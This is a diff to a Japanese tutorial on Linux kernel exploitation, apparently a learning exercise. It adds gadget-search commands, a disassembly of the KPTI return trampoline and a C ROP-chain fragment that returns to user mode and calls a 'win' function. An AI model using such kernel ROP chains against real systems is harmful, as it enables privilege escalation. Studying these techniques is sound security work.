@@ -278,7 +278,7 @@ $ extract-vmlinux bzImage > vmlinux
 ```
 あとはお好みのツールを使ってROP gadgetを探します。
 ```
-$ ropr vmlinux --nosys --nojop -R '^pop rdi.+ret;'
+$ ropr vmlinux --noisy --nosys --nojop -R '^pop rdi.+ret;'
 ...
 0xffffffff8127bbdc: pop rdi; ret;
 ...
@@ -397,13 +397,38 @@ ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
 	UNWIND_HINT_EMPTY
 ```
 の部分は事前にスタックをその場所に調整していたものです。
-そして、続くpushは本来`iretq`に渡るはずだったカーネルのスタックにあったデータを、CR3更新後にもアクセス可能な領域にコピーしているコードです。したがって、ROP中では次の箇所にジャンプする必要があります。
+そして、続くpushは本来`iretq`に渡るはずだったカーネルのスタックにあったデータを、CR3更新後にもアクセス可能な領域にコピーしているコードです。したがって、ROP中では次の0xffffffff81800e26の箇所にジャンプする必要があります。
 
 <center>
   <img src="img/kpti_trampoline.png" alt="swapgs_restore_regs_and_return_to_usermodeのtrampoline" style="width:480px;">
 </center>
 
-最後のpopに気をつけて、KPTIのもとでも動くkROPを自分の手で完成させてみてください。
+今回の場合はswapgsの前に`pop rax`と`pop rdi`があります。
+```
+   0xffffffff81800e89:  pop    rax
+   0xffffffff81800e8a:  pop    rdi
+   0xffffffff81800e8b:  swapgs
+```
+先ほどの図で`push [rdi]; push rax`していた値がここでrax, rdiに戻されます。そして、`swapgs`時点でのスタックは冒頭の
+```
+   0xffffffff81800e32:  push   QWORD PTR [rdi+0x30]
+   0xffffffff81800e35:  push   QWORD PTR [rdi+0x28]
+   0xffffffff81800e38:  push   QWORD PTR [rdi+0x20]
+   0xffffffff81800e3b:  push   QWORD PTR [rdi+0x18]
+   0xffffffff81800e3e:  push   QWORD PTR [rdi+0x10]
+```
+で構築されたもの（rdiは元のrsp）ですので、gadget呼び出しの0x10バイト先にswapgsで使うデータを置く必要があります。
+```c
+*chain++ = rop_bypass_kpti;
+*chain++ = 0xdeadbeef;
+*chain++ = 0xdeadbeef;
+*chain++ = (unsigned long)&win; // [rdi+0x10]
+*chain++ = user_cs;
+*chain++ = user_rflags;
+*chain++ = user_rsp;
+*chain++ = user_ss;
+```
+この点に気をつけて、KPTIのもとでも動くkROPを自分の手で完成させてみてください。
 
 ## KASLRの回避
 ここまでKASLRを無効化してきましたが、KASLR有効だとexploit可能でしょうか。
